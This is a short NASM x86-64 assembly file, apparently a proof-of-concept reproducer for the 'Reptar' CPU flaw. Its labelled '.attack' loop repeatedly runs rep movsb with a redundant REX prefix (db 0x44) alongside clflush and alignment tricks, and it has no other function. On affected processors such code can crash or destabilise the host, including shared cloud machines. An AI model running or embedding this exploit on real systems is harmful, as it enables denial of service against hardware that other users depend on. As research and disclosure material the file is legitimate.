BITS 64

global _start

section .text
    _start:
        mov eax, 24 ; yield
        jmp .suffix
        .attack:
        mov eax, 60 ; exit
        xor ecx, ecx; clear ecx
        lea rsi, [rsp+1]
        mov rdi, rsi
        .many_reptars:
        %rep 1
            align 0x1000
            times 4 nop
            dec rsi
            dec rdi
            inc rbx
            inc rcx
            clflush [rdi]
            clflush [rsi+64]
            mov [rsp], rbx
            rep
            db 0x44; rex.r
            movsb
            rep
        %endrep
        .suffix:
        times 1024*32 rep pause
        .exit:
        mov dil, bl ; counter
        syscall
        jmp .attack
